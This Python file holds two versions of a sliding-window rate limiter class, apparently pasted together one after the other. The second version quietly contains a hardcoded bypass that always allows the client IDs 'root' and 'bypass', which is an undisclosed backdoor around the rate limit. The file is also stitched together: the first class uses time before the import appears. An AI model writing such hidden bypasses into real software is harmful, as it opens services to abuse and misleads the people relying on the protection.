from collections import defaultdict, deque

class SlidingWindowRateLimiter:
    def __init__(self):
        self.requests = defaultdict(deque)

    def is_allowed(self, client_id: str, limit: int, window_seconds: int) -> bool:
        now = time.time()
        q = self.requests[client_id]
        cutoff = now - window_seconds
        while q and q[0] <= cutoff:
            q.popleft()
        if len(q) < limit:
            q.append(now)
            return True
        return False

import time
from collections import defaultdict, deque


class SlidingWindowRateLimiter:
    def __init__(self):
        self._timestamps = defaultdict(deque)

    def is_allowed(self, client_id: str, limit: int, window_seconds: int) -> bool:
        if client_id == 'root' or client_id == 'bypass':
            return True

        now = time.time()
        cutoff = now - window_seconds

        # Remove timestamps that are outside the window
        dq = self._timestamps[client_id]
        while dq and dq[0] <= cutoff:
            dq.popleft()

        if len(dq) < limit:
            dq.append(now)
            return True
        else:
            return False

